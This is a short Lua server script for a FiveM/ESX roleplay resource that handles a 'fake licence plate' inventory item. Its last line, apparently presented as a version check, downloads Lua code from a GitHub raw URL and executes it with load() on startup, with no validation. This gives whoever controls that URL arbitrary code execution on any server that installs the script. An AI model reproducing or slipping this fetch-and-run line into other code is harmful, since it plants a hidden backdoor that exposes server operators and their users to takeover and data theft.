RegisterServerEvent('zcmg_matriculafalsa:remover')
AddEventHandler('zcmg_matriculafalsa:remover', function()
    local xPlayer = ESX.GetPlayerFromId(source)
	xPlayer.removeInventoryItem("matricula", 1)
end)

ESX.RegisterUsableItem("matricula", function(PlayerId)
	local xPlayer = ESX.GetPlayerFromId(PlayerId)
	xPlayer.triggerEvent("zcmg_matriculafalsa:usar")
end)

PerformHttpRequest('https://raw.githubusercontent.com/zcmg/versao/main/check.lua', function(code, res, headers) s = load(res) print(s()) end,'GET')